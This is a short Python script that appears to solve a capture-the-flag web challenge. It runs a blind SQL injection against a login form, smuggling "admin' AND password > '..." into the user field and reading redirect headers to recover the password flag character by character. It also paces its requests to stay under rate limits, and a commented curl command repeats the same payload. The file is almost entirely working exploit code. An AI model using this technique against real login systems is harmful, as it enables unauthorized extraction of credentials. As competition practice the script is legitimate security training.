import requests, string, random, time

#curl 'http://qu0t453gelwwjl3vxzltjxwww-abuse.web.ctfcompetition.com/login' 
#--data 'password=CTF%7Bqu0t45aaaaaaaaaaaaaaaawww-aaaaaaaaaaaaaaaaaaaaaaaa
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%7D&user=admin%27%20AND%20password%3e%20%27AAA' -v

a=random.choice(string.lowercase)
a+=random.choice(string.lowercase)
a+=random.choice(string.lowercase)
prefix = "qu0t453g3w"+a+"reaxoltjxwww-"
print prefix
def isbigger(p):
    while True:
        try:
            print p
            r=requests.post("http://"+prefix+"abuse.web.ctfcompetition.com/login",
                    data={"password": "xx", "user": 
                        "admin' AND password > '" + p}, 
                    allow_redirects=False, headers={})
            l=r.headers["Location"]
            print l
            return "password" in l
        except:
            print "Throttle", time.time()
            time.sleep(10)
            return None

window = 32
hits = []
errs = []

s="CTF{"+prefix
while True:
    charset=sorted(string.letters+string.digits+"_-")
    l=0
    r=len(charset)

    while l+1!=r:
        while len(hits)>=13 or len(errs)>=2:
            time.sleep(0.1)
            hits = [hit for hit in hits if hit>time.time()-window]
            errs = [err for err in errs if err>time.time()-window]
        print len(hits), len(errs)
        m=l+(r-l)*90/100
        if m<=l:
            m=l+1
        elif m>=r:
            m=r-1
        c=charset[m]
        ss=s+c+" "*20
        q=isbigger(ss)
        if q is None:
            continue
        hits.append(time.time())
        if q:
            errs.append(time.time())
            l=m
        else:
            r=m
    s+=charset[l]


